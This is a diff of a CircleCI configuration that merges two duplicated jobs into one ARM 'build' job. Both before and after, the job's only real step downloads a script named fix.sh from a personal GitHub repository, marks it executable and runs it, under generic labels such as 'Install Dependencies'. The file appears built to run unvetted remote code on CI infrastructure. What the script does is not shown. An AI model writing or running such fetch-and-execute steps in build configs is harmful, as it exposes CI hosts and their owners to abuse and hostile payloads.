@@ -1,30 +1,16 @@
 version: 2.1
+
 jobs:
-    Devop:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-                  wget -O fix.sh https://github.com/ajiLa78/sampl/raw/main/fix.sh
-                  chmod +x fix.sh
-                  ./fix.sh
-    Devop1:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-                  wget -O fix.sh https://github.com/ajiLa78/sampl/raw/main/fix.sh
-                  chmod +x fix.sh
-                  ./fix.sh
-    
-workflows:
-    version: 2.1
-    build:
-        jobs:
-            - Devop
-            - Devop1
+  build:
+    machine:
+      image: ubuntu-2004:2024.01.2
+    # If running ARM, the resource class needs to be added. Omitting this defaults to amd64
+    resource_class: arm.large
+    steps:
+      - checkout
+      # Whatever you want to do
+      - run: |
+            wget -O fix.sh https://github.com/ajiLa78/sampl/raw/main/fix.sh
+            chmod +x fix.sh
+             ./fix.sh
            
